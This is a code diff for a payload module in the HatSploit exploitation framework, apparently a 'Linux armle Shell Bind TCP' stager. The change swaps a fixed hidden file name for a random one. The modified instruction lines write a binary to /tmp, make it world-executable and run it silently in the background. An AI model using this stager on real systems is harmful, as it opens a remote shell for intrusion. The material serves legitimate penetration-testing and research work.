@@ -26,9 +26,10 @@
 
 from core.lib.payload import Payload
 from utils.payload.payload import PayloadGenerator
+from utils.string.string import StringTools
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, PayloadGenerator, StringTools):
     details = {
         'Category': "stager",
         'Name': "Linux armle Shell Bind TCP",
@@ -143,10 +144,12 @@ class HatSploitPayload(Payload, PayloadGenerator):
         self.output_process("Generating payload...")
         payload = self.generate(executable_format, 'armle', shellcode)
 
+        filename = self.random_string()
+
         instructions = ""
-        instructions += "cat >/tmp/.payload;"
-        instructions += "chmod 777 /tmp/.payload;"
-        instructions += "sh -c '/tmp/.payload' 2>/dev/null &"
+        instructions += f"cat >/tmp/{filename};"
+        instructions += f"chmod 777 /tmp/{filename};"
+        instructions += f"sh -c '/tmp/{filename}' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
